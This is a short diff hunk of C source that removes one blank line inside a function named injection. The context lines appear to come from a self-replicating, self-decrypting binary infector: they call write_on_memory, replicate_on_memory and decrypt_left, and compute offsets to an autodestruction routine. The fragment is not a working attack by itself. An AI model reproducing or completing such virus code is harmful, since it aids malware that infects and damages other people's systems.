@@ -223,7 +223,6 @@ void injection(struct s_host *host, struct s_keychain *keychain, enum e_context 
 		goto label;
 	}
 
-
 	write_on_memory(host, ptr);
 	replicate_on_memory(host, ptr);
 	decrypt_left(keychain, ptr + host->note->self->p_offset + ((void *)injection - (void *)__entry), (void *)autodestruction - (void *)injection);
